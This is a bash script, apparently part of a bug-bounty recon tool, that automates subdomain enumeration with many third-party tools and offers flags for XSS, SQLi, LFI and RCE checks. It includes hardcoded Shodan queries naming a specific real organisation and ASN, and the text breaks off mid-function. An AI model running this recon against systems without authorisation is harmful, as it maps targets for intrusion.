#!/bin/bash

# Default config file path
CONFIG_PATH="configuration/garudrecon.cfg"

TARGET=""

EXCLUDE_FUNCS=()
RECON_XSS=false
RECON_SQLI=false
RECON_LFI=false
RECON_SUBTAKEOVER=false
RECON_RCE=false
RECON_IIS=false

# Help function
function show_help() {
  cat <<EOF
Performs a medium-level reconnaissance on the target domain, typically scoped as *.domain.com. This includes subdomain enumeration, vulnerability checks (like XSS, SQLi, LFI, etc.), and optional filtering of out-of-scope subdomains.

Usage:
  garudrecon mediumscope [flags]

Flags:
  -d, --domain				Scan a domain (e.g. domain.com)
  -ef, --exclude-functions		Exclude a function from running (e.g. AMASS)
  -rx, --recon-xss			Run full recon with XSS checks
  -rs, --recon-sqli			Run full recon with SQLi checks
  -rl, --recon-lfi			Run full recon with LFI checks
  -rst, --recon-subtakeover		Run full recon with Subdomain Takeover checks
  -rr, --recon-rce 	   		Run full recon with RCE checks
  -ri, --recon-iis 	   		Run full recon with IIS checks
  -oos, --outofscope			Exclude outofscope subdomains from a list (e.g. domain.com.oos)
  -c, --config				Custom configuration file path
  -h, --help				help for mediumscope

Example:
# Full recon
  garudrecon mediumscope -d domain.com

# Recon with XSS only
  garudrecon mediumscope -d domain.com -rx

# Recon with SQLi only
  garudrecon mediumscope -d domain.com -rs

# Exclude functions manually
  garudrecon mediumscope -d domain.com -ef "SUBFINDER,AMASS"

# Combined
  garudrecon mediumscope -d domain.com -rx -ef "AMASS"
EOF
}

# Check if no args
if [[ $# -eq 0 ]]; then
  show_help
  exit 0
fi

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -d|--domain)
            TARGET="$2"
            shift 2
            ;;
        -ef|--exclude-functions)
            IFS=',' read -ra raw_funcs <<< "$2"
            EXCLUDE_FUNCS=()
            for func in "${raw_funcs[@]}"; do
                trimmed_func=$(echo "$func" | xargs)
                EXCLUDE_FUNCS+=("$trimmed_func")
            done
            shift 2
            ;;
	    -rx|--recon-xss)
	        RECON_XSS=true
	        shift
	        ;;
	    -rs|--recon-sqli)
	        RECON_SQLI=true
	        shift
	        ;;
	    -rl|--recon-lfi)
	        RECON_LFI=true
	        shift
	        ;;
	    -rst|--recon-subtakeover)
	        RECON_SUBTAKEOVER=true
	        shift
	        ;;
	    -rr|--recon-rce)
	        RECON_RCE=true
	        shift
	        ;;
	    -ri|--recon-iis)
	        RECON_IIS=true
	        shift
	        ;;
        -oos|--outofscope)
		    if [[ -z "$2" || "$2" == -* ]]; then
		        echo "Error: -oos requires a valid filename argument"
		        exit 1
		    fi

		    if [[ ! -s "$2" || ! -f "$2" ]]; then
		        echo "Error: OOS file '$2' does not exist or is empty"
		        exit 1
		    fi

		    OOS_FILE="$2"
		    shift 2
		    ;;
        -c|--config)
            CONFIG_PATH="$2"
            shift 2
            ;;
        -h|--help)
	        show_help
	        exit 0
	        ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Escape dots in domain for regex
ESCAPED_TARGET=$(echo "$TARGET" | sed 's/\./\\./g')

if [[ -z "$TARGET" ]]; then
    echo "Error: Target domain is required. Use -d <domain>"
    exit 1
fi

# Load configuration
if [[ -f "$CONFIG_PATH" ]]; then
    source "$CONFIG_PATH"
else
    echo "Error: Configuration file '$CONFIG_PATH' not found."
    exit 1
fi

PRINTBANNER

# Check root user
AREUROOTUSER

# Base directory
BASEDIR="scans"

# Function to generate a unique directory name
generate_unique_dir(){
    local dir_path="$BASEDIR/$TARGET"
    local counter=1
    
    while [ -d "$dir_path" ]; do
        dir_path="$BASEDIR/${TARGET}_$counter"
        ((counter++))
    done

    echo "$dir_path"
}

# Generate unique domain directory
UNIQUEDOMAINDIR=$(generate_unique_dir)
TMPDIR="$UNIQUEDOMAINDIR/.tmp"

# Subdirectories within .tmp
SUBDOMAINDIR="$TMPDIR/subdomain"
FFUFBRUTE="$TMPDIR/ffufbrute"
FAVICON_HASH="$TMPDIR/favicon_hash"
SCREENSHOTS="$TMPDIR/screenshots"
URLSDIR="$TMPDIR/urls"
VULNDIR="$TMPDIR/vuln"
GITHUB_ENDPOINTSDIR="$URLSDIR/github_endpoints"
CRAWLEYDIR="$URLSDIR/crawley"
CARIDDIDIR="$URLSDIR/cariddi"
XCRAWL3RDIR="$URLSDIR/xcrawl3r"
GOLINKFINDERDIR="$URLSDIR/GoLinkFinder"
AUTOMATED_GOOGLE_DORKINGDIR="$URLSDIR/dorks_hunter"
SOURCEMAPPERDIR="$URLSDIR/sourcemapper"
FTPDIR="$VULNDIR/ftp"
IISIDR="$VULNDIR/iis"
DOTGITDIR="$VULNDIR/dotgit"
PDFTOTEXTDIR="$VULNDIR/pdftotext"

# Root-level directories in UNIQUEDOMAINDIR
ROOT_SUBDOMAINDIR="$UNIQUEDOMAINDIR/subdomain"
ROOT_URLSDIR="$UNIQUEDOMAINDIR/urls"
ROOT_EMAILSDIR="$UNIQUEDOMAINDIR/emails"
ROOT_VULNDIR="$UNIQUEDOMAINDIR/vuln"
ROOT_INPUTFILES="$UNIQUEDOMAINDIR/inputfiles"
ROOT_WORDLISTDIR="$UNIQUEDOMAINDIR/wordlist"

ERRORLOGFILE="$UNIQUEDOMAINDIR/error.log"
RESUMELOGFILE="$UNIQUEDOMAINDIR/resume.cfg"


# Creating directories
# Subdirectories within .tmp
mkdir -p "$UNIQUEDOMAINDIR"
mkdir -p "$TMPDIR"
mkdir -p "$SUBDOMAINDIR"
mkdir -p "$FFUFBRUTE"
mkdir -p "$FAVICON_HASH"
mkdir -p "$SCREENSHOTS"
mkdir -p "$URLSDIR"
mkdir -p "$VULNDIR"
mkdir -p "$GITHUB_ENDPOINTSDIR"
mkdir -p "$CRAWLEYDIR"
mkdir -p "$CARIDDIDIR"
mkdir -p "$XCRAWL3RDIR"
mkdir -p "$GOLINKFINDERDIR"
mkdir -p "$AUTOMATED_GOOGLE_DORKINGDIR"
mkdir -p "$SOURCEMAPPERDIR"
mkdir -p "$FTPDIR"
mkdir -p "$IISIDR"
mkdir -p "$DOTGITDIR"
mkdir -p "$PDFTOTEXTDIR"

# Root-level directories in UNIQUEDOMAINDIR
mkdir -p "$ROOT_SUBDOMAINDIR"
mkdir -p "$ROOT_URLSDIR"
mkdir -p "$ROOT_EMAILSDIR"
mkdir -p "$ROOT_VULNDIR"
mkdir -p "$ROOT_INPUTFILES"
mkdir -p "$ROOT_WORDLISTDIR"

# Creating files
touch "$ROOT_INPUTFILES/crunchbase.txt"
touch "$ROOT_INPUTFILES/manual_google_dorking.txt"

# Utility function to check if a function is excluded
is_excluded() {
    local func="$1"
    for excluded in "${EXCLUDE_FUNCS[@]}"; do
        if [[ "$excluded" == "$func" ]]; then
            return 0
        fi
    done
    return 1
}

run() {
    local func="$1"
    if is_excluded "$func"; then
        echo -e "${YELLOW}[~] $func${RESET}: 0, ${TIME} seconds" | unew -a $RESUMELOGFILE
    else
        $func
    fi
}

# Function to handle CLEANUP on Ctrl+C
CLEANUP(){
    if [[ -n "$SPINNER_PID" ]]; then
        kill "$SPINNER_PID" 2>/dev/null
    fi
    exit 1
}
trap CLEANUP SIGINT

START_SPINNER(){
    processing="${1}"
    START_TIME=$(date +%s)
    BRAILLE_STYLE_SPINNER_CHARS=("â ‹" "â ™" "â ¹" "â ¸" "â ¼" "â ´" "â ¦" "â §" "â ‡" "â ")
    # SLASH_SPINNER_CHARS=("/" "-" "\\" "|")
    # ARC_SPINNER_CHARS=("â—" "â—“" "â—‘" "â—’")
    # CLASSIC_DOTS_SPINNER_CHARS=("â ‚" "â ’" "â " "â °" "â ´" "â ¦" "â –" "â ’")
    # ARROW_SPINNER_CHARS=("â†" "â†–" "â†‘" "â†—" "â†’" "â†˜" "â†“" "â†™")
    # BOX_SPINNER_CHARS=("â––" "â–˜" "â–" "â–—")
    # QUARTERS_SPINNER_CHARS=("â—´" "â—·" "â—¶" "â—µ")
    # CLOCK_SPINNER_CHARS=("ðŸ•›" "ðŸ•" "ðŸ•‘" "ðŸ•’" "ðŸ•“" "ðŸ•”" "ðŸ••" "ðŸ•–" "ðŸ•—" "ðŸ•˜" "ðŸ•™" "ðŸ•š")
    # EMOJI_SPINNER_CHARS=("ðŸŒ‘" "ðŸŒ’" "ðŸŒ“" "ðŸŒ”" "ðŸŒ•" "ðŸŒ–" "ðŸŒ—" "ðŸŒ˜")
    # TRAIL_SPINNER_CHARS=("â " "â ‚" "â „" "â ‚")

    while true; do
    	ELAPSED=$(( $(date +%s) - START_TIME ))
        for char in "${BRAILLE_STYLE_SPINNER_CHARS[@]}"; do
            printf "${YELLOW}[${char}]${RESET} ${processing} ${CYAN}(${ELAPSED} seconds)${RESET} ðŸ”Ž"
            printf "                                    \r"
            sleep 0.05
        done
    done &
    SPINNER_PID=$!
}

STOP_SPINNER(){
    kill "${SPINNER_PID}" 2>/dev/null
    TIME=$(( $(date +%s) - START_TIME ))
    return $TIME
}

STARTED_AT=$(date +"%d-%m-%Y_%H:%M:%S")
START_EPOCH=$(date +%s)

echo -e "Using $CONFIG_PATH"
echo -e "Saving all files in $UNIQUEDOMAINDIR"


DOWNLOAD_UPDATED_RESOLVERS(){
	rm -rf $ROOT_WORDLISTDIR/resolvers.txt
	rm -rf $ROOT_WORDLISTDIR/stable_resolvers.txt

	wget -q -O $ROOT_WORDLISTDIR/resolvers.txt https://raw.githubusercontent.com/rix4uni/resolvers/refs/heads/main/resolvers.txt
	wget -q -O $ROOT_WORDLISTDIR/stable_resolvers.txt https://raw.githubusercontent.com/rix4uni/resolvers/refs/heads/main/stable_resolvers.txt
}

NUCLEIHUB_TEMPLATES(){
	# if $ROOT_WORDLISTDIR/nuclei-templates and $ROOT_WORDLISTDIR/nucleihub-templates not exist then run these commands

	nuclei -duc -silent -update-templates -update-template-dir $ROOT_WORDLISTDIR/nuclei-templates &>/dev/null
    git clone https://github.com/rix4uni/nucleihub-templates.git --depth 1 $ROOT_WORDLISTDIR/nucleihub-templates &>/dev/null
}

# Passive Subdomain Enumeration
BUGBOUNTYDATA(){
	START_SPINNER "${BGREEN}BUGBOUNTYDATA${RESET}"

	curl -s "https://raw.githubusercontent.com/rix4uni/BugBountyData/refs/heads/main/data/${TARGET}.txt" | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bugbountydata.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/bugbountydata.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bugbountydata.subs

    STOP_SPINNER
	echo -e "${BGREEN}[+] BUGBOUNTYDATA${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/bugbountydata.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SUBFINDER(){
	START_SPINNER "${BGREEN}SUBFINDER${RESET}"

	subfinder -duc -silent -d ${TARGET} -all -config ~/.config/subfinder/config.yaml -pc ~/.config/subfinder/provider-config.yaml -max-time ${SUBFINDER_ENUM_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subfinder.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/subfinder.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subfinder.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBFINDER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/subfinder.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

AMASS(){
	START_SPINNER "${BGREEN}AMASS${RESET}"

	amass enum -nocolor -nolocaldb -passive -norecursive -noalts -d ${TARGET} -config ~/.config/amass/config.ini -timeout ${AMASS_ENUM_TIMEOUT} 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/amass.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/amass.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/amass.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] AMASS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/amass.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SUBDOG(){
	START_SPINNER "${BGREEN}SUBDOG${RESET}"

	echo ${TARGET} | subdog -silent -tools all | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subdog.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/subdog.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/subdog.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBDOG${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/subdog.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XSUBFIND3R(){
	START_SPINNER "${BGREEN}XSUBFIND3R${RESET}"

	echo ${TARGET} | xsubfind3r --silent | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/xsubfind3r.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/xsubfind3r.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/xsubfind3r.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] XSUBFIND3R${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/xsubfind3r.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

FINDOMAIN(){
	START_SPINNER "${BGREEN}FINDOMAIN${RESET}"

	findomain -t ${TARGET} -q | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/findomain.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/findomain.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/findomain.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] FINDOMAIN${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/findomain.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CHAOS(){
	START_SPINNER "${BGREEN}CHAOS${RESET}"

	chaos -duc -silent -d ${TARGET} -key $(shuf -n 1 ~/.config/chaos/chaos-api.txt) | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/chaos.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/chaos.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/chaos.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] CHAOS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/chaos.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GITHUB_SUBDOMAINS(){
	START_SPINNER "${BGREEN}GITHUB_SUBDOMAINS${RESET}"

	github-subdomains -d ${TARGET} -t ~/.config/github-subdomains/.github_tokens -o ${SUBDOMAINDIR}/tmp-github-subdomains.subs &>/dev/null
	cat ${SUBDOMAINDIR}/tmp-github-subdomains.subs | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/github-subdomains.subs && rm -rf ${SUBDOMAINDIR}/tmp-github-subdomains.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/github-subdomains.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/github-subdomains.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] GITHUB_SUBDOMAINS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/github-subdomains.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

BBOT(){
	START_SPINNER "${BGREEN}BBOT${RESET}"

	bbot --silent -t ${TARGET} -f subdomain-enum -rf passive -n bbot_scan -o $SUBDOMAINDIR -y &>/dev/null
	cat ${SUBDOMAINDIR}/bbot_scan/subdomains.txt | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bbot.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/bbot.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bbot.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] BBOT${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/bbot.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ONEFORALL(){
	START_SPINNER "${BGREEN}ONEFORALL${RESET}"

	tools/OneForAll/oneforall.py --target ${TARGET} --brute False --dns False --req False --alive False --takeover False --fmt json --path ${SUBDOMAINDIR}/${TARGET}-oneforall.json run &>/dev/null
	cat ${SUBDOMAINDIR}/${TARGET}-oneforall.json 2>/dev/null | jq -r '.[].subdomain' | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/oneforall.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/oneforall.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/oneforall.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ONEFORALL${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/oneforall.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SHOSUBGO(){
	START_SPINNER "${BGREEN}SHOSUBGO${RESET}"

	shosubgo -d ${TARGET} -s $(shuf -n 1 ~/.config/shosubgo/shosubgo-api.txt) | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/shosubgo.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/shosubgo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/shosubgo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] SHOSUBGO${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/shosubgo.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ASSETFINDER(){
	START_SPINNER "${BGREEN}ASSETFINDER${RESET}"

	assetfinder --subs-only ${TARGET} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/assetfinder.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/assetfinder.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/assetfinder.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ASSETFINDER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/assetfinder.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

HAKTRAILS(){
	START_SPINNER "${BGREEN}HAKTRAILS${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "~/.config/haktools/haktrails-config.yml" ]; then
        echo -e "${BRED}[x] HAKTRAILS${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	echo ${TARGET} | haktrails subdomains | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/haktrails.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/haktrails.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/haktrails.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] HAKTRAILS${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/haktrails.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

HAKTRAILSFREE(){
    if [ ! -s "$SUBDOMAINDIR/securitytrails.subs" ]; then
        echo -e "${GRAY}[!] You using securitytrails free api key it only allows you to scrape 2k subdomains, follow this url you can scrape 10k subdomains, then add these subdomains in ${SUBDOMAINDIR}/securitytrails.subs currently file is empty. Please choose an option:${RESET}"
        echo -e "${GRAY}1. Wait for up to 30 minutes, I'm not done yet still doing google dorking but allow me to continue if i'm done earlier by pressing Enter button"
        echo -e "${GRAY}2. Done, I have done google dorking don't wait now"
        echo -e "${GRAY}3. Skip, I don't have time for manual google dorking"

        # Read user input with a timeout of 1 minute
        read -t ${MANUAL_GOOGLE_DORKING_OPTION_WAIT} -p "Select an option (1/2/3): " option

        # If no input after 60 seconds, automatically select Option 1
        if [ -z "$option" ]; then
            option=${MANUAL_GOOGLE_DORKING_OPTION_SELECT}
            echo -e "\n${GRAY}[+] No input received from user, automatically choosing Option ${MANUAL_GOOGLE_DORKING_OPTION_SELECT}${RESET}"
        fi
        
        case "$option" in
            1)
                echo -e "${BGREEN}[+] Waiting for up to 30 minutes. Press Enter if you're done early...${RESET}"
                
                # Display prompt once and enter wait loop
                counter=0
                while true; do
                    read -t 60 -n 1 input
                    if [ $? -eq 0 ]; then
                        echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"
                        break
                    fi
                    # Exit after 30 minutes if Enter is not pressed
                    ((counter++))
                    if [ $counter -eq ${MANUAL_GOOGLE_DORKING_TIME} ]; then
                        echo -e "${BGREEN}[+] 30 minutes have passed. Proceeding...${RESET}"
                        break
                    fi
                done
                ;;
            2)
                echo -e "${BGREEN}[+] Done with Google dorking. Proceeding...${RESET}"
                ;;
            3)
                echo -e "${YELLOW}[!] Skipping manual Google dorking.${RESET}"
                return
                ;;
            *)
                echo -e "${YELLOW}[!] Invalid option. Skipping manual Google dorking.${RESET}"
                return
                ;;
        esac
    fi

    # echo ${TARGET} | haktrailsfree -silent | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/haktrailsfree.subs

    # Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/haktrailsfree.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/haktrailsfree.subs

    # Display the count of lines in manual_google_dorking.urls
    echo -e "${BGREEN}[+] HAKTRAILSFREE${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/securitytrails.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

OCCRP(){
	START_SPINNER "${BGREEN}OCCRP${RESET}"

	# do this manually

	STOP_SPINNER
	echo -e "${BGREEN}[+] ORG2ASN${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/occrp-orgs.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ORG2ASN(){
	START_SPINNER "${BGREEN}ORG2ASN${RESET}"

	if [ "$ORG2ASN_SCAN_MODE" = "NORMAL" ]; then
		echo "$TARGET" | cut -d"." -f1 | org2asn -silent | unew -el -t -q ${SUBDOMAINDIR}/org2asn.txt
	fi

	if [ "$ORG2ASN_SCAN_MODE" = "ADVANCED" ]; then
		echo "$TARGET" | cut -d"." -f1 | org2asn -silent | unew -el -t -q ${SUBDOMAINDIR}/org2asn.txt
		cat ${SUBDOMAINDIR}/org2asn.txt | cut -d"[" -f5 | sed 's/]$//' | org2asn -silent | unew -el -t -q ${SUBDOMAINDIR}/org2asn.txt
	fi



	# Common steps for both conditions
	# wait for 30 minutes to remove manually, now remove those not belong to your comapny in ${SUBDOMAINDIR}/org2asn.txt using sublime

	sed -i 's/^[^]]*] //' ${SUBDOMAINDIR}/org2asn.txt
	cat ${SUBDOMAINDIR}/org2asn.txt | grep -oP '\[.*?\](?= \[ASN\])' | sed 's/^\[//' | sed 's/\]$//' | unew -el -t -q ${SUBDOMAINDIR}/asns.txt
	cat ${SUBDOMAINDIR}/org2asn.txt | grep -oP '\[.*?\](?= \[Route\])' | sed 's/^\[//' | sed 's/\]$//' | unew -el -t -q ${SUBDOMAINDIR}/ips.txt
	cat ${SUBDOMAINDIR}/org2asn.txt | grep -oP '(?<=\[ASN\] ).*' | sed 's/^\[//' | sed 's/\]$//' | unew -el -t -q ${SUBDOMAINDIR}/orgs.txt
	cat ${SUBDOMAINDIR}/org2asn.txt | grep -oP '(?<=\[Route\] ).*' | sed 's/^\[//' | sed 's/\]$//' | unew -el -t -q ${SUBDOMAINDIR}/orgs.txt


	cat ${SUBDOMAINDIR}/*.subs | unew | cero -c ${CERO_THREADS} -t ${CERO_TIMEOUT} | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cero.subs

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/cero.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/cero.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] ORG2ASN${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/cero.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

IPFINDER(){
	START_SPINNER "${BGREEN}IPFINDER${RESET}"

	if ! command -v ipfinder &>/dev/null; then
        echo -e "${BRED}[x] IPFINDER${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${SUBDOMAINDIR}/ips.txt | ipfinder shodan --silent
	cat ${SUBDOMAINDIR}/ips.txt | mapcidr -silent

	# echo 'ip:"173.0.84.0/24"' | ipfinder shodan --silent
	echo 'ssl:"$TARGET"' | ipfinder shodan --silent
	echo 'hostname:"$TARGET"' | ipfinder shodan --silent
	echo 'ssl.cert.subject.cn:"$TARGET"' | ipfinder shodan --silent
	echo 'org:"FIDELITY NATIONAL INFORMATION SERVICES"' | ipfinder shodan --silent
	echo 'asn:"AS3614"' | ipfinder shodan --silent
	# cat ${SUBDOMAINDIR}/asns.txt | sed 's/.*/asn:"&"/' | ipfinder shodan --silent

	if [ "$IPFINDER_SCAN_MODE" = "NORMAL" ]; then
		cat ${SUBDOMAINDIR}/*.subs | unew | certinfo -silent -c 50 | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	if [ "$IPFINDER_SCAN_MODE" = "ADVANCED" ]; then
		rcert -list ${SUBDOMAINDIR}/*.subs | unew | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/subdomain/certinfo.subs 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] IPFINDER${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/certinfo.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

IPRANGES(){
	START_SPINNER "${BGREEN}IPRANGES${RESET}"

	if ! command -v ipranges &>/dev/null; then
        echo -e "${BRED}[x] IPRANGES${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	echo "$TARGET" | ipranges -silent | unew -el -t -q ${SUBDOMAINDIR}/ipranges.txt

	if [ "$IPRANGES_SCAN_MODE" = "NORMAL" ]; then
		cat ${SUBDOMAINDIR}/*.subs | unew | certinfo -silent -c 50 | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	fi

	if [ "$IPRANGES_SCAN_MODE" = "ADVANCED" ]; then
